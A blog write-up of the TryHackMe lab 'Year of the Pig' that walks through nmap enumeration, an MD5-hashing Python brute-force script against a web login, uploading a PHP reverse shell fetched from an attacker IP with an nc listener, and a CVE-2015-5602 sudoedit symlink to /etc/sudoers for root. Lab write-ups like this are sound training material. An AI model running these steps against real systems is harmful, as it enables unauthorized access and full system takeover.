---
title: "Year of the Pig"
date: 2023-07-13T16:07:36+05:30
draft: false
toc: true
images:
tags:
  - Writeups
  - TryHackMe
---

Machine URL :: [Year of the pig](https://tryhackme.com/room/yearofthepig)
## ENUMERATION
Nmap :
```bash
nmap -sC -sV -p- 10.10.9.235  
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-12 13:10 IST
Nmap scan report for 10.10.9.235
Host is up (0.057s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Marco's Blog
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Let's start with the webserver.

{{< image src="/images/pig/1.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

Use gobuster for directory bruteforcing:

{{< image src="/images/pig/2.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

This reveals the admin directory which yields us this as `/login.php`:

{{< image src="/images/pig/3.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

### Web Login:
The page is sending an AJAX request to `/api/login` using JSON format for the user input. Also , the password value is MD5 hash value of the string.

{{< image src="/images/pig/4.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

For wrong credentials the following message appears:\
`Remember that passwords should be a memorable word, followed by two numbers and a special character`\
Take a note of that.\

Let's attempt to bruteforce this login now.
We need a custom wordlist as ensured by the password policy. Scanning the page for 'memorable' words gives us this:
```plain-text
Marco
marco
plane
planes
airplane
airplanes
airforce
flying
Savoia
savoia
Macchi
macchi
Curtiss
curtiss
milan
Milan
mechanic
maintenance
Italian
italian
Agility
agility
```
You can use [CeWL](https://digi.ninja/projects/cewl.php) for this.\
Adding a custom rule to `/etc/john/john.conf`. This will fulfill the password policy required.
```
[List.Rules:yop]
Az"[0-9][0-9][!#$%&(),*=/?]"
```
But the passwords are MD5-Hashed first before being sent to the login. Use this python program to hash the passwords and use them to bruteforce the login:
```python
#!/usr/bin/python3
import requests
import sys
import json
import hashlib

payload= {"username":sys.argv[2],"password":"test"}

i = 0
for line in sys.stdin:
    payload["password"] = hashlib.md5(line.rstrip().encode('utf-8')).hexdigest()
    r = requests.post(sys.argv[1]+"/api/login",data=json.dumps(payload))
    json_data = json.loads(r.content)
    i = i +1
    if i % 10 == 0:
        print(str(i),end="\r")
    if json_data["Response"] != "Error":
        print (line)
        break
```
 Got this from [auth.py](https://gist.github.com/j11b0/c5101a9d32be96ff73fa4a72c0705290#file-auth-py)\
 This takes a while. Thankfully the password doesn't seem to reset with every reboot.

{{< image src="/images/pig/6.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

Going forward we see:

{{< image src="/images/pig/7.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

Now this is a complete rabbit hole. The commands section only responds to some commands like `whoami`which tells us we are `www-data` and `id`.

## FOOTHOLD
SSH as marco using the same password and you get the first flag immediately.

{{< image src="/images/pig/8.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

Looking in the `/var/www` directory to find some hints of what to do with the webserver we find that marco can edit any file here except `admin.db`.

{{< image src="/images/pig/9.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

To read `admin.db` we need to be www-data. So, let’s use our edit access to upload the PentestMonkey PHP reverse shell (located by default on Kali at `/usr/share/webshells/php/php-reverse-shell.php`) — making sure to change the IP and port number. \Using wget:
```bash
root@kali:/usr/share/webshells/php# python3 -m http.server
marco@year-of-the-pig:/var/www/html/admin$ wget YOUR-IP:8000/php-reverse-shell.php
```
Start a listener with `nc -lvnp <chosen-port>` then activate the shell by going to `http://<machine-ip>/php-reverse-shell.php`
{{< image src="/images/pig/10.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

We can't read the databse in a non-interactive shell , so to upgrade use :\
`python3 -c 'import pty; pty.spawn("/bin/bash")'`

{{< image src="/images/pig/11.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

We got the password hashes of user curtis.

{{< image src="/images/pig/12.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

`su curtis` and you'll get the 2nd flag in his home directory.

## PRIVILEGE ESCALATION
Checking `sudo -l` we see that Curtis can execute sudoedit as sudo, against some files in /var/www/html.

{{< image src="/images/pig/13.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

Checking ExploitDB for sudoedit exploit gives us [this](https://www.exploit-db.com/exploits/37710).\
Checking sudo version confirms we are to use the CVE-2015-5602 exploit.
```bash
curtis@year-of-the-pig:~$ sudo --version
Sudo version 1.8.13
Sudoers policy plugin version 1.8.13
Sudoers file grammar version 44
Sudoers I/O plugin version 1.8.13
```
In this version of sudo , sudoedit does not check the full path if a wildcard is used twice (e.g. `/html/*/*/config.php`), allowing a malicious user to replace the `config.php` real file with a symbolic link to a different location.\
Marco being part of the `web-developers` can create such a path.\
Now symlink this to `/etc/sudoers` file so we may give curtis sudo access. You can use this with the `/etc/passwd` file to add your own password.

{{< image src="/images/pig/15.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

Back to Curtis : `sudoedit /var/www/html/dir1/dir2/config.php`
This did not work with sudo for some reason.\
Add curtis to the file :
```plain-text
## User Privilege Specification
##
root ALL=(ALL) ALL
curtis ALL=(ALL) ALL
## Uncomment to allow members of group wheel to execute any command
```
Now you can use su to elevate your privileges.

{{< image src="/images/pig/16.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

